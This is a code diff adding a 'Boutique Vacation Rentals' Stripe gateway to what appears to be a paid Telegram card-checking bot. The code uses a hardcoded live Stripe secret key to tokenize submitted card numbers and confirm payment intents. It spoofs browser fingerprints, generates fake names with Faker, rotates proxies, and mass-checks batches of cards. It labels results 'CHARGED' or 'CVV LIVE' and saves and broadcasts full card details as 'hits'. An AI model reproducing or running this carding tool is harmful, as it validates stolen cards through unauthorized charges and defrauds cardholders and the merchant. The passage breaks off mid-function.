@@ -4499,7 +4499,2113 @@ async def auto_stripe_mass_check_with_pool(update: Update, context: ContextTypes
         print(f"🏁 [Stripe Auth Mass] Session ended for user {u_id}")
         
         
+# ============ BOUTIQUE VACATION RENTALS STRIPE GATEWAY (FIXED AUTH) ============
+
+import uuid
+import json
+import time
+import random
+import asyncio
+import traceback
+import re
+from typing import Dict, Tuple, Optional
+import httpx
+from faker import Faker
+from datetime import datetime, timedelta
+
+# ============ CONFIGURATION ============
+BOUTIQUE_STRIPE_SECRET_KEY = "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"
+BOUTIQUE_STRIPE_PUBLISHABLE_KEY = "pk_live_51RaC8gQq2KMJDaUqaO5shu43R2AYoE9wMClU1TgRksEdEWZ6cJ8aKZ7x1zTQB1S9sL5nH7mJ9v3XsLzN7oVkD8wD00pLQpYH4M"
+BOUTIQUE_AMOUNT = 1000  # $10.00 in cents
+BOUTIQUE_CURRENCY = "aud"
+
+# Active tasks
+boutique_api_active_tasks = {}
+
+
+def _generate_guid() -> str:
+    return str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=8))
+
+
+def _generate_muid() -> str:
+    return str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=8))
+
+
+def _generate_sid() -> str:
+    return str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=8))
+
+
+def _generate_session_id() -> str:
+    return str(uuid.uuid4())
+
+
+async def create_stripe_payment_method(cc: str, mm: str, yy: str, cvv: str, 
+                                        first_name: str, last_name: str, 
+                                        proxy: str = None) -> Optional[str]:
+    """
+    Create a Stripe payment method (tokenize card) using the secret key
+    FIXED: Proper Authorization header
+    """
+    print(f"📡 Creating Stripe payment method...")
+    
+    # Format year (2-digit)
+    if len(yy) == 4:
+        yy = yy[2:]
+    mm = mm.zfill(2)
+    
+    # Generate fingerprinting data
+    guid = _generate_guid()
+    muid = _generate_muid()
+    sid = _generate_sid()
+    session_id = _generate_session_id()
+    time_on_page = random.randint(30000, 60000)
+    
+    # Prepare payment method data
+    pm_data = {
+        'type': 'card',
+        'card[number]': cc,
+        'card[cvc]': cvv,
+        'card[exp_month]': mm,
+        'card[exp_year]': yy,
+        'billing_details[name]': f"{first_name} {last_name}",
+        'billing_details[address][postal_code]': '10010',
+        'guid': guid,
+        'muid': muid,
+        'sid': sid,
+        'pasted_fields': 'number',
+        'payment_user_agent': 'stripe.js/8e4e1e6ec5; stripe-js-v3/8e4e1e6ec5; card-element',
+        'referrer': 'https://boutiquevacationrentals.cloud',
+        'time_on_page': str(time_on_page),
+        'client_attribution_metadata[client_session_id]': session_id,
+        'client_attribution_metadata[merchant_integration_source]': 'elements',
+        'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
+        'client_attribution_metadata[merchant_integration_version]': '2017',
+        'client_attribution_metadata[wallet_config_id]': str(uuid.uuid4()),
+    }
+    
+    pm_headers = {
+        'accept': 'application/json',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'user-agent': generate_user_agent(),
+        # ============ FIX: Add Authorization header with Bearer token ============
+        'Authorization': f'Bearer {BOUTIQUE_STRIPE_SECRET_KEY}',
+    }
+    
+    # Configure proxy
+    proxy_url = None
+    if proxy:
+        proxy_url = format_proxy(proxy)
+    
+    try:
+        async with httpx.AsyncClient(
+            timeout=httpx.Timeout(45.0, connect=15.0, read=35.0),
+            verify=False,
+            proxy=proxy_url,
+            follow_redirects=True
+        ) as client:
+            response = await client.post(
+                'https://api.stripe.com/v1/payment_methods',
+                headers=pm_headers,
+                data=pm_data
+            )
+            
+            print(f"📥 PM response status: {response.status_code}")
+            
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    error_msg = error_data.get('error', {}).get('message', 'Unknown error')
+                    print(f"❌ Payment method creation failed: {error_msg}")
+                    return None
+                except:
+                    print(f"❌ Payment method creation failed: HTTP {response.status_code}")
+                    return None
+            
+            pm_result = response.json()
+            payment_method_id = pm_result.get('id')
+            
+            if payment_method_id:
+                print(f"✅ Payment method created: {payment_method_id}")
+                return payment_method_id
+            
+            return None
+            
+    except Exception as e:
+        print(f"❌ Payment method creation error: {e}")
+        return None
+
+
+async def create_boutique_payment_intent(payment_method_id: str, amount: int = BOUTIQUE_AMOUNT, 
+                                          currency: str = BOUTIQUE_CURRENCY, proxy: str = None) -> Tuple[Optional[str], Optional[str]]:
+    """
+    Create a Payment Intent using the Stripe secret key
+    FIXED: Proper Authorization header
+    """
+    print(f"📡 Creating Payment Intent...")
+    
+    pi_data = {
+        'amount': str(amount),
+        'currency': currency,
+        'payment_method': payment_method_id,
+        'confirmation_method': 'manual',
+        'confirm': 'false',
+        'return_url': 'https://boutiquevacationrentals.cloud/payments/',
+        'metadata[source]': 'boutique_checker',
+    }
+    
+    pi_headers = {
+        'accept': 'application/json',
+        'content-type': 'application/x-www-form-urlencoded',
+        'user-agent': generate_user_agent(),
+        # ============ FIX: Add Authorization header with Bearer token ============
+        'Authorization': f'Bearer {BOUTIQUE_STRIPE_SECRET_KEY}',
+    }
+    
+    # Configure proxy
+    proxy_url = None
+    if proxy:
+        proxy_url = format_proxy(proxy)
+    
+    try:
+        async with httpx.AsyncClient(
+            timeout=httpx.Timeout(45.0, connect=15.0, read=35.0),
+            verify=False,
+            proxy=proxy_url,
+            follow_redirects=True
+        ) as client:
+            response = await client.post(
+                'https://api.stripe.com/v1/payment_intents',
+                headers=pi_headers,
+                data=pi_data
+            )
+            
+            print(f"📥 PI response status: {response.status_code}")
+            
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    error_msg = error_data.get('error', {}).get('message', 'Unknown error')
+                    print(f"❌ Payment Intent creation failed: {error_msg}")
+                    return None, None
+                except:
+                    print(f"❌ Payment Intent creation failed: HTTP {response.status_code}")
+                    return None, None
+            
+            pi_result = response.json()
+            payment_intent_id = pi_result.get('id')
+            client_secret = pi_result.get('client_secret')
+            
+            if payment_intent_id and client_secret:
+                print(f"✅ Payment Intent created: {payment_intent_id}")
+                print(f"✅ Client secret: {client_secret[:30]}...")
+                return payment_intent_id, client_secret
+            
+            return None, None
+            
+    except Exception as e:
+        print(f"❌ Payment Intent error: {e}")
+        return None, None
+
+
+async def confirm_payment_intent(payment_intent_id: str, client_secret: str, 
+                                  proxy: str = None) -> Dict:
+    """
+    Confirm the Payment Intent using the Stripe secret key
+    FIXED: Proper Authorization header
+    """
+    print(f"\n🔥 Confirming Payment Intent...")
+    
+    confirm_data = {
+        'payment_method': client_secret.split('_secret')[0] if '_secret' in client_secret else '',
+    }
+    
+    confirm_headers = {
+        'accept': 'application/json',
+        'content-type': 'application/x-www-form-urlencoded',
+        'user-agent': generate_user_agent(),
+        # ============ FIX: Add Authorization header with Bearer token ============
+        'Authorization': f'Bearer {BOUTIQUE_STRIPE_SECRET_KEY}',
+    }
+    
+    # Configure proxy
+    proxy_url = None
+    if proxy:
+        proxy_url = format_proxy(proxy)
+    
+    try:
+        async with httpx.AsyncClient(
+            timeout=httpx.Timeout(45.0, connect=15.0, read=35.0),
+            verify=False,
+            proxy=proxy_url,
+            follow_redirects=True
+        ) as client:
+            response = await client.post(
+                f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',
+                headers=confirm_headers,
+                data=confirm_data
+            )
+            
+            print(f"📥 Confirm response status: {response.status_code}")
+            
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    error_msg = error_data.get('error', {}).get('message', 'Unknown error')
+                    print(f"❌ Confirm failed: {error_msg}")
+                    return {'status': 'error', 'message': error_msg}
+                except:
+                    print(f"❌ Confirm failed: HTTP {response.status_code}")
+                    return {'status': 'error', 'message': f'HTTP {response.status_code}'}
+            
+            result = response.json()
+            print(f"📥 Confirm response: {json.dumps(result, indent=2)[:500]}")
+            return {'status': 'success', 'data': result}
+            
+    except Exception as e:
+        print(f"❌ Confirm error: {e}")
+        return {'status': 'error', 'message': str(e)}
+
+
+async def check_card_boutique_api(card: str, proxy: str = None, user_id: int = None) -> Dict:
+    """
+    Check card using Boutique Vacation Rentals Stripe API with secret key
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [BOUTIQUE API] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    print(f"{'='*80}")
+    
+    start_time = time.time()
+    
+    try:
+        # Parse card
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error",
+                "elapsed": 0
+            }
         
+        cc, mm, yy, cvv = parts
+        
+        # Generate fake customer data
+        fake = Faker()
+        first_name = fake.first_name()
+        last_name = fake.last_name()
+        
+        print(f"👤 Customer: {first_name} {last_name}")
+        print(f"💰 Amount: ${BOUTIQUE_AMOUNT/100:.2f} {BOUTIQUE_CURRENCY.upper()}")
+        
+        # Step 1: Create Payment Method (tokenize card)
+        payment_method_id = await create_stripe_payment_method(
+            cc, mm, yy, cvv, first_name, last_name, proxy
+        )
+        
+        if not payment_method_id:
+            return {
+                "status": "error",
+                "result": "PM_CREATION_FAILED",
+                "message": "Failed to create payment method",
+                "status_display": "⚠️ PM ERROR",
+                "status_category": "error",
+                "elapsed": time.time() - start_time,
+                "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+                "gateway": "Boutique Vacation Rentals"
+            }
+        
+        # Step 2: Create Payment Intent
+        payment_intent_id, client_secret = await create_boutique_payment_intent(
+            payment_method_id, BOUTIQUE_AMOUNT, BOUTIQUE_CURRENCY, proxy
+        )
+        
+        if not payment_intent_id or not client_secret:
+            return {
+                "status": "error",
+                "result": "PI_CREATION_FAILED",
+                "message": "Failed to create payment intent",
+                "status_display": "⚠️ PI ERROR",
+                "status_category": "error",
+                "elapsed": time.time() - start_time,
+                "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+                "gateway": "Boutique Vacation Rentals"
+            }
+        
+        # Step 3: Confirm Payment Intent
+        confirm_result = await confirm_payment_intent(
+            payment_intent_id, client_secret, proxy
+        )
+        
+        elapsed = time.time() - start_time
+        
+        if confirm_result['status'] == 'error':
+            error_msg = confirm_result.get('message', 'Unknown error')
+            return parse_stripe_error(error_msg, elapsed, payment_method_id, payment_intent_id)
+        
+        # Step 4: Parse the response
+        result_data = confirm_result.get('data', {})
+        return parse_payment_intent_result(result_data, elapsed, payment_method_id, payment_intent_id)
+        
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+        elapsed = time.time() - start_time
+        return {
+            "status": "error",
+            "result": "ERROR",
+            "message": str(e)[:100],
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals"
+        }
+
+
+def parse_stripe_error(error_msg: str, elapsed: float, pm_id: str = None, pi_id: str = None) -> Dict:
+    """Parse Stripe error messages"""
+    error_lower = error_msg.lower()
+    
+    print(f"🔍 Parsing error: {error_msg}")
+    
+    if "insufficient" in error_lower or "funds" in error_lower or "balance" in error_lower:
+        return {
+            "status": "success",
+            "result": "INSUFFICIENT_FUNDS",
+            "message": f"Insufficient funds: {error_msg}",
+            "status_display": "💰 INSUFFICIENT FUNDS",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals",
+            "payment_method_id": pm_id,
+            "payment_intent_id": pi_id
+        }
+    elif "cvv" in error_lower or "security" in error_lower or "cvc" in error_lower:
+        return {
+            "status": "success",
+            "result": "CVV_LIVE",
+            "message": f"CVV verification failed: {error_msg}",
+            "status_display": "✅ CVV LIVE",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals",
+            "payment_method_id": pm_id,
+            "payment_intent_id": pi_id
+        }
+    elif "declined" in error_lower or "card_declined" in error_lower:
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": f"Card declined: {error_msg}",
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals",
+            "payment_method_id": pm_id,
+            "payment_intent_id": pi_id
+        }
+    elif "expired" in error_lower:
+        return {
+            "status": "declined",
+            "result": "EXPIRED",
+            "message": f"Expired card: {error_msg}",
+            "status_display": "❌ EXPIRED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals"
+        }
+    elif "3d" in error_lower or "secure" in error_lower or "authentication" in error_lower:
+        return {
+            "status": "success",
+            "result": "3DS_REQUIRED",
+            "message": f"3D Secure required: {error_msg}",
+            "status_display": "🔐 3D REQUIRED",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals",
+            "payment_method_id": pm_id,
+            "payment_intent_id": pi_id
+        }
+    elif "incorrect" in error_lower or "invalid" in error_lower:
+        return {
+            "status": "declined",
+            "result": "INVALID_CARD",
+            "message": f"Invalid card details: {error_msg}",
+            "status_display": "❌ INVALID CARD",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals"
+        }
+    else:
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": error_msg,
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals"
+        }
+
+
+def parse_payment_intent_result(result_data: dict, elapsed: float, pm_id: str = None, pi_id: str = None) -> Dict:
+    """Parse the payment intent result"""
+    
+    # Check for error in result
+    if 'error' in result_data:
+        error = result_data['error']
+        error_msg = error.get('message', 'Unknown error')
+        return parse_stripe_error(error_msg, elapsed, pm_id, pi_id)
+    
+    # Check status
+    status = result_data.get('status')
+    
+    if status == 'succeeded':
+        print(f"\n✅✅✅ PAYMENT SUCCESSFUL! Card charged ${BOUTIQUE_AMOUNT/100:.2f} ✅✅✅")
+        return {
+            "status": "success",
+            "result": "CHARGED",
+            "message": f"Payment successful - Card charged ${BOUTIQUE_AMOUNT/100:.2f}",
+            "status_display": "🔥 CHARGED 🔥",
+            "status_category": "charged",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals",
+            "payment_intent_id": result_data.get('id'),
+            "payment_method_id": pm_id
+        }
+    elif status == 'requires_action':
+        next_action = result_data.get('next_action', {})
+        if next_action.get('type') == 'redirect_to_url':
+            return {
+                "status": "success",
+                "result": "3DS_REQUIRED",
+                "message": "3D Secure required - Authentication needed",
+                "status_display": "🔐 3D REQUIRED",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+                "gateway": "Boutique Vacation Rentals",
+                "redirect_url": next_action.get('redirect_to_url', {}).get('url', ''),
+                "payment_intent_id": result_data.get('id'),
+                "payment_method_id": pm_id
+            }
+        else:
+            return {
+                "status": "success",
+                "result": "3DS_REQUIRED",
+                "message": "3D Secure required - Authentication needed",
+                "status_display": "🔐 3D REQUIRED",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+                "gateway": "Boutique Vacation Rentals",
+                "payment_intent_id": result_data.get('id'),
+                "payment_method_id": pm_id
+            }
+    elif status == 'requires_payment_method':
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": "Card was declined",
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals",
+            "payment_intent_id": result_data.get('id'),
+            "payment_method_id": pm_id
+        }
+    else:
+        return {
+            "status": "unknown",
+            "result": status,
+            "message": f"Payment status: {status}",
+            "status_display": f"⚠️ {status}",
+            "status_category": "unknown",
+            "elapsed": elapsed,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals",
+            "payment_intent_id": result_data.get('id'),
+            "payment_method_id": pm_id
+        }
+
+
+def format_boutique_api_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Boutique Vacation Rentals API response for display"""
+    if result is None:
+        result = {
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "message": "No response from gateway",
+            "elapsed": 0,
+            "price": f"${BOUTIQUE_AMOUNT/100:.2f}",
+            "gateway": "Boutique Vacation Rentals"
+        }
+
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "Boutique Vacation Rentals")
+    price = result.get("price", f"${BOUTIQUE_AMOUNT/100:.2f}")
+
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+
+    clean_message = message[:80] if message else "Unknown"
+    if len(message) > 80:
+        clean_message += "..."
+
+    country_name = country.replace('🌐', '').strip() if country else "Unknown"
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+
+    bank_display = bank if bank and bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+
+    if "CHARGED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "3D" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3D REQUIRED"
+    elif "APPROVED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+
+    return ui, status_category
+
+
+# ============ COMMAND HANDLERS ============
+
+
+async def single_check_boutique_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Boutique Vacation Rentals API - /btq <card>"""
+    if not await verify_group_access(update, context):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Boutique Vacation Rentals Gateway</b>\n\n"
+            "Usage: <code>/btq &lt;card&gt;</code>\n"
+            "Example: <code>/btq 4242424242424242|12|2028|123</code>\n\n"
+            f"💰 Amount: ${BOUTIQUE_AMOUNT/100:.2f} AUD\n"
+            "📍 Gateway: Boutique Vacation Rentals Stripe\n"
+            "✅ Checks: Charged, CVV Live, Insufficient Funds, 3D Secure",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4242424242424242|12|2028|123"
+        )
+        return
+
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        error_message = (
+            f"❌ <b>Boutique Vacation Rentals not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+        add_user_credits(user_id, 1)
+        return
+
+    boutique_api_active_tasks[user_id] = True
+
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+
+        status_msg = await message.reply_text("🔄 Checking card with Boutique Vacation Rentals...")
+
+        await speed_controller.wait_if_needed()
+        start = time.time()
+
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 Using proxy: {mask_proxy(proxy_str)}")
+
+        result = await check_card_boutique_api(card, proxy_str, user_id)
+
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+
+        bin_info = await get_bin_info(card)
+
+        try:
+            await status_msg.delete()
+        except:
+            pass
+
+        ui, status_category = format_boutique_api_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="Boutique Vacation Rentals",
+                response=result.get("message", "Approved"),
+                price=f"${BOUTIQUE_AMOUNT/100:.2f}",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="Boutique Vacation Rentals", card=card,
+                    response=result.get("message", "Charged"),
+                    price=f"${BOUTIQUE_AMOUNT/100:.2f}",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+
+        user_manager.increment_checks(user_id)
+
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(
+            f"❌ <b>Error</b>\n\nCould not check card. Please try again later.\nError: {str(e)[:100]}",
+            parse_mode=ParseMode.HTML
+        )
+        add_user_credits(user_id, 1)
+    finally:
+        boutique_api_active_tasks.pop(user_id, None)
+
+
+async def mass_check_boutique_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with Boutique Vacation Rentals API - /mbtq <cards>"""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Boutique Vacation Rentals not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use /btq for single checks.\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+
+            await message.delete()
+            await mass_check_boutique_api_logic(update, context, cards, None)
+            return
+
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Boutique Vacation Rentals Mass Check</b>\n\n"
+            "Usage: <code>/mbtq &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mbtq\n\n"
+            f"💰 Amount: ${BOUTIQUE_AMOUNT/100:.2f} AUD\n"
+            "📍 Gateway: Boutique Vacation Rentals Stripe\n"
+            "✅ Only charged/approved cards will be shown",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Truncated to {max_batch} cards.")
+
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        await message.delete()
+    except:
+        pass
+
+    await mass_check_boutique_api_logic(update, context, cards, None)
+
+
+async def mass_check_boutique_api_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """Mass check logic for Boutique Vacation Rentals API"""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    print(f"\n{'='*80}")
+    print(f"🚀 [BOUTIQUE API MASS] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies")
+
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+
+    start_time = time.time()
+    proxy_index = 0
+
+    try:
+        boutique_api_active_tasks[u_id] = True
+        tier = user_manager.get_tier(u_id)
+
+        CONCURRENCY = {
+            "free": 2,
+            "premium": 5,
+            "ultimate": 10,
+            "admin": 15,
+        }.get(tier, 2)
+
+        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ Boutique Vacation Rentals\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 10 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+
+            progress_text = (
+                f"<b>Gateway</b> ➛ Boutique Vacation Rentals\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
